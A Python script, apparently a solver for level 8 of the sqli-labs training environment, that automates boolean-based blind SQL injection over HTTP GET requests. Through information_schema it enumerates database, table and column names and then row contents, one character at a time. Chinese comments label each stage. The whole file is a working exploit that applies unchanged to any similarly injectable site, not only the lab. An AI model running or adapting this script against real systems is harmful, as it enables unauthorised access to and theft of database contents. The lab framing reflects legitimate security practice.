import requests
from bs4 import BeautifulSoup

class Less8(object):

    def __init__(self,url,level,dbs,tables,columns,schema,d,t,c):

        if url[-1] == "/":
            self.url = url
        else:
            self.url = url + "/"

        self.level = level
        self.dbs = dbs
        self.tables = tables
        self.columns = columns
        self.schema = schema
        self.d = d
        self.t = t
        self.c = c

    
    def dbs_payload(self):    # 枚举所有数据库名
        count = 0
        dbs = []
        asciis = 0
        strings = ''

        if self.level == 8:   # 枚举数据库总数
            while True:
                rep = requests.get(self.url + "?id=1' and (select count(schema_name) from information_schema.schemata)="+str(count)+" --+")
                if "You are in" not in rep.text:
                    count += 1
                else:
                    break

            for each in range(count):
                number = 0
                while True:      # 枚举所有数据库名的长度
                    rep = requests.get(self.url+"?id=1' and (select length((select schema_name from information_schema.schemata limit "+str(each)+",1)))="+str(number)+" --+")
                    if "You are in" not in rep.text:
                        number += 1
                    else:
                        dbs.append(number)
                        break

            for i,db_len in enumerate(dbs):
                while True:                           #枚举ascii码对应的十进制数字
                    for each in range(1,db_len+1):
                        while True:
                            rep = requests.get(self.url+"?id=1' and ascii(substr((select schema_name from information_schema.schemata limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+" --+")
                            if "You are in" not in rep.text:
                                asciis += 1
                            else:
                                strings += chr(asciis)
                                asciis = 0
                                break

                    print(strings)
                    strings = ''
                    break

    def tables_payload(self):
        count = 0
        dbs = []                                                                  # 下面的枚举顺序和上面的一样,只不过是表和列和数据
        asciis = 0
        strings = ''            # 枚举所有表名

        if self.level == 8:
            while True:
                rep = requests.get(self.url + "?id=1' and (select count(table_name) from information_schema.tables where table_schema='"+self.d+"')="+str(count)+" --+")
                if "You are in" not in rep.text:
                    count += 1
                else:
                    break

            for each in range(count):
                number = 0
                while True:
                    rep = requests.get(self.url+"?id=1' and length((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(each)+",1))="+str(number)+" --+")
                    if "You are in" not in rep.text:
                        number += 1
                    else:
                        dbs.append(number)
                        break

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            rep = requests.get(self.url+"?id=1' and  ascii(substr((select table_name from information_schema.tables where table_schema='"+self.d+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+" --+")
                            if "You are in" not in rep.text:
                                asciis += 1
                            else:
                                strings += chr(asciis)
                                asciis = 0
                                break

                    print(strings)
                    strings = ''
                    break

    def columns_payload(self):
        count = 0
        dbs = []
        asciis = 0                              # 枚举所有列名
        strings = ''

        if self.level == 8:  # get each total columns count
            while True:
                rep = requests.get(self.url+"?id=1' and (select count(column_name) from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"')="+str(count)+" --+")
                if "You are in" not in rep.text:
                    count += 1
                else:
                    break

            for each in range(count):
                number = 0
                while True:
                    rep = requests.get(self.url+"?id=1' and length((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(each)+",1))="+str(number)+" --+")
                    if "You are in" not in rep.text:
                        number += 1
                    else:
                        dbs.append(number)
                        break

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            rep = requests.get(self.url+"?id=1' and ascii(substr((select column_name from information_schema.columns where table_schema='"+self.d+"' and table_name='"+self.t+"' limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+" --+")
                            if "You are in" not in rep.text:
                                asciis += 1
                            else:
                                strings += chr(asciis)
                                asciis = 0
                                break
                    print(strings)
                    strings = ''
                    break

    def data_payload(self):
        count = 0
        dbs = []
        asciis = 0
        strings = ''
                                                        # 枚举所有数据
        if self.level == 8:
            while True:
                rep = requests.get(self.url+"?id=1' and (select count("+self.c+") from "+self.d+"."+self.t+")="+str(count)+" --+")
                if "You are in" not in rep.text:
                    count += 1
                else:
                    break

            for each in range(count):
                number = 0
                while True:
                    rep = requests.get(self.url+"?id=1' and length((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(each)+",1))="+str(number)+" --+")
                    if "You are in" not in rep.text:
                        number += 1
                    else:
                        dbs.append(number)
                        break

            for i,db_len in enumerate(dbs):
                while True:
                    for each in range(1,db_len+1):
                        while True:
                            rep = requests.get(self.url+"?id=1' and ascii(substr((select "+self.c+" from "+self.d+"."+self.t+" limit "+str(i)+",1),"+str(each)+",1))="+str(asciis)+" --+")
                            if "You are in" not in rep.text:
                                asciis += 1
                            else:
                                strings += chr(asciis)
                                asciis = 0
                                break
                    print(strings)
                    strings = ''
                    break

    def DBS(self):
        self.dbs_payload()

    def TABLES(self):
        self.tables_payload()

    def COLUMNS(self):
        self.columns_payload()

    def SCHEMA(self):
        self.data_payload()

    def TYPE(self):

        if self.dbs:
            self.DBS()

        elif self.d !='' and self.tables:
            self.TABLES()

        elif self.t != '' and self.columns and self.d != '':
            self.COLUMNS()

        elif self.c != '' and self.t != '' and self.d != '' and self.schema:
            self.SCHEMA()

    def Less_8(self):
        self.TYPE()

